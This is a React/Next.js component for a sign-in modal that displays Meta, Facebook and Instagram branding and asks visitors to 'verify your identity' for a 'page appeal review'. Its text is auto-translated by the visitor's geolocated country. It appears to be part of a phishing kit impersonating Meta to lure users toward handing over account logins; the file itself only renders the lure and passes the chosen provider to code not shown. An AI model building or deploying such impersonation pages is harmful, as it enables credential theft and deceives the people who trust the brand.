'use client';

import { store } from '@/store/store';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';
import HeroImage from '@/assets/images/bg_hero.png';
import InstagramLogo from '@/assets/images/logo-insta.webp';
import MetaLogo from '@/assets/images/logo-meta.svg';

const ContinueModal: FC<{ onSelect: (provider: 'instagram' | 'facebook') => void }> = ({ onSelect }) => {
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Sign in to continue', 'Choose how you want to verify your account to proceed with the appeal.', 'Continue with Instagram', 'Continue with Facebook', 'Verify your identity to continue your page appeal review.', 'By continuing, you agree to our Terms of Service and Privacy Policy.'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/55 p-4'>
            <div className='relative flex max-h-[90vh] w-full max-w-230 overflow-hidden rounded-2xl bg-white shadow-2xl'>
                <div className='relative hidden min-h-105 w-[44%] bg-[#0b5cff] md:block'>
                    <Image src={HeroImage} alt='' fill className='object-cover opacity-90' />
                    <div className='absolute inset-0 bg-linear-to-t from-[#0b5cff]/95 via-[#0b5cff]/40 to-transparent' />
                    <Image src={MetaLogo} alt='Meta' className='absolute top-8 left-8 h-6 w-auto brightness-0 invert' />
                    <p className='absolute right-8 bottom-8 left-8 text-xl font-bold text-white'>{t('Verify your identity to continue your page appeal review.')}</p>
                </div>
                <div className='flex flex-1 flex-col items-center justify-center px-6 py-10 text-center md:px-12'>
                    <Image src={MetaLogo} alt='Meta' className='mb-6 h-5.5 w-auto md:hidden' />
                    <h2 className='mb-2 text-[28px] font-bold text-[#1c1e21]'>{t('Sign in to continue')}</h2>
                    <p className='mb-8 max-w-90 text-sm text-[#65676b]'>{t('Choose how you want to verify your account to proceed with the appeal.')}</p>
                    <button type='button' onClick={() => onSelect('facebook')} className='mb-3 flex h-13.5 w-full max-w-95 items-center justify-center gap-3 rounded-xl border border-[#dadde1] bg-white text-[15px] font-semibold'>
                        <svg viewBox='0 0 24 24' width='20' height='20' aria-hidden='true'><path fill='#1877F2' d='M24 12.073c0-6.627-5.373-12-12-12S0 5.446 0 12.073c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z' /></svg>
                        {t('Continue with Facebook')}
                    </button>
                    <button type='button' onClick={() => onSelect('instagram')} className='relative mb-3 flex h-13.5 w-full max-w-95 items-center justify-center gap-3 rounded-xl border border-[#dadde1] bg-white text-[15px] font-semibold hover:border-pink-300'>
                        <Image src={InstagramLogo} alt='' width={22} height={22} />
                        {t('Continue with Instagram')}
                    </button>
                    <p className='mt-3 max-w-95 text-xs text-[#8a8d91]'>{t('By continuing, you agree to our Terms of Service and Privacy Policy.')}</p>
                </div>
            </div>
        </div>
    );
};

export default ContinueModal;
